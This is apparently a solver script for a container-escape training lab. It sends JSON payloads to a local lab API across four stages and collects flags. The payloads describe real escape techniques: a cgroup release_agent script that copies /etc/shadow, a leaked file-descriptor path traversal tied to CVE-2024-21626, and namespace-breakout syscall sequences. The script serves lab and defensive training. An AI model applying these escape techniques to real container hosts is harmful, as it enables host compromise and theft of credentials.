#!/usr/bin/env python3
"""
Lab 64: ContainerEscapeLsmLab Automated Solution Exploit
Demonstrates both vulnerable exploitation and secure eBPF LSM defense verification
across all 4 stages.
"""

import sys
import requests

BASE_URL = "http://127.0.0.1:8064"

def solve_stage1(base_url: str):
    print("[*] Stage 1: User Namespace Privileged Capability Escalation (bpf_lsm_userns_create)...")
    payload = {
        "clone_flags": ["CLONE_NEWUSER", "CLONE_NEWNS"],
        "target_caps": ["CAP_SYS_ADMIN", "CAP_NET_ADMIN"],
        "uid_mapping": "0 1000 1",
        "use_lsm_guard": True
    }
    res = requests.post(f"{base_url}/api/stage1/eval", json=payload)
    data = res.json()
    assert data.get("success") is True, f"Stage 1 failed: {data}"
    flag = data.get("flag")
    print(f"  [+] Stage 1 Flag: {flag}")
    return flag

def solve_stage2(base_url: str):
    print("[*] Stage 2: Cgroup v2 Release Agent & Procfs Kernel Overwrite (bpf_lsm_file_open)...")
    payload = {
        "target_path": "/sys/fs/cgroup/release_agent",
        "payload": "#!/bin/sh\ncat /etc/shadow > /tmp/host_shadow\n",
        "mount_flags": ["rw", "relatime"],
        "use_lsm_guard": True
    }
    res = requests.post(f"{base_url}/api/stage2/eval", json=payload)
    data = res.json()
    assert data.get("success") is True, f"Stage 2 failed: {data}"
    flag = data.get("flag")
    print(f"  [+] Stage 2 Flag: {flag}")
    return flag

def solve_stage3(base_url: str):
    print("[*] Stage 3: Leaked Host File Descriptor & Mount Traversal (CVE-2024-21626)...")
    payload = {
        "fd_descriptor": "/proc/self/fd/7",
        "relative_traversal": "../../../etc/shadow",
        "target_action": "read",
        "use_lsm_guard": True
    }
    res = requests.post(f"{base_url}/api/stage3/eval", json=payload)
    data = res.json()
    assert data.get("success") is True, f"Stage 3 failed: {data}"
    flag = data.get("flag")
    print(f"  [+] Stage 3 Flag: {flag}")
    return flag

def solve_stage4(base_url: str):
    print("[*] Stage 4: Autonomous Kernel Runtime Zero-Trust Shield & Immediate Killswitch...")
    payload = {
        "process_tree": [
            {"pid": 101, "comm": "runc-child", "ppid": 1},
            {"pid": 102, "comm": "sh", "ppid": 101}
        ],
        "syscall_sequence": ["unshare", "pivot_root", "setns"],
        "target_ns_breakout": "init_pid_ns",
        "use_lsm_runtime_shield": True
    }
    res = requests.post(f"{base_url}/api/stage4/eval", json=payload)
    data = res.json()
    assert data.get("success") is True, f"Stage 4 failed: {data}"
    flag = data.get("flag")
    print(f"  [+] Stage 4 Flag: {flag}")
    return flag

def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else BASE_URL
    print(f"=== Lab 64 Exploit Solver Starting against {base_url} ===")
    f1 = solve_stage1(base_url)
    f2 = solve_stage2(base_url)
    f3 = solve_stage3(base_url)
    f4 = solve_stage4(base_url)
    print("\n🎉 All 4 stages successfully solved!")
    print(f"  Stage 1: {f1}")
    print(f"  Stage 2: {f2}")
    print(f"  Stage 3: {f3}")
    print(f"  Stage 4: {f4}")

if __name__ == "__main__":
    main()
